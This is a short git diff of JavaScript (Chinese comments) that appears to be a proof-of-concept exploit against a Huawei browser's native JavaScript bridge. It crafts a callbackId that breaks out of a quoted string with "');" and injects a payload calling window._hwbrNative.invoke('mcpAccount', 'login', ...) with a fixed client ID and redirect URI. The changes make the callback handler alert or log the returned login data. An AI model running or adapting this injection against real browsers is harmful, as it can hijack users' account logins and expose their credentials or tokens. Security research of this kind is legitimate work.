@@ -24,7 +24,7 @@
             });
 
             const currUrl = location.href;
-            const payload = `console.log(11111);window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true; const loginInfo = {clientId: "6917565689792636463", redirectUri: "https://privacy.consumer.huawei.com/browser.html", scope: "all",accessType: "", state: "200", ui_locales: ""};const callbackId = \`aaa\`;    window._hwbrNative.invoke('mcpAccount', 'login', callbackId, loginInfo, -1); ;}`;
+            const payload = `console.log(11111);window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||((e, n, t, r, i)=>{alert("callbackFromNative callbackId: ".concat(e, ", isSuccess: ").concat(n, ", status: ").concat(t, ",r args: ").concat(JSON.stringify(r)))});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true; const loginInfo = {clientId: "6917565689792636463", redirectUri: "https://privacy.consumer.huawei.com/browser.html", scope: "all",accessType: "", state: "200", ui_locales: ""};const callbackId = \`aaa\`;    window._hwbrNative.invoke('mcpAccount', 'login', callbackId, loginInfo, -1); ;}`;
             const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
             // 缓存回调函数
@@ -70,7 +70,7 @@
 
         // 4. 初始化hwbr对象（精简判断逻辑）
         window.hwbr = window.hwbr || {};
-        window.hwbr.callbackFromNative = window.hwbr.callbackFromNative || (() => {
+        window.hwbr.callbackFromNative = window.hwbr.callbackFromNative || ((e, n, t, r, i) => {console.info("callbackFromNative callbackId: ".concat(e, ", isSuccess: ").concat(n, ", status: ").concat(t, ",r args: ").concat(JSON.stringify(r)))
         });
 
         // 5. 挂载全局并调用（参数格式合规）
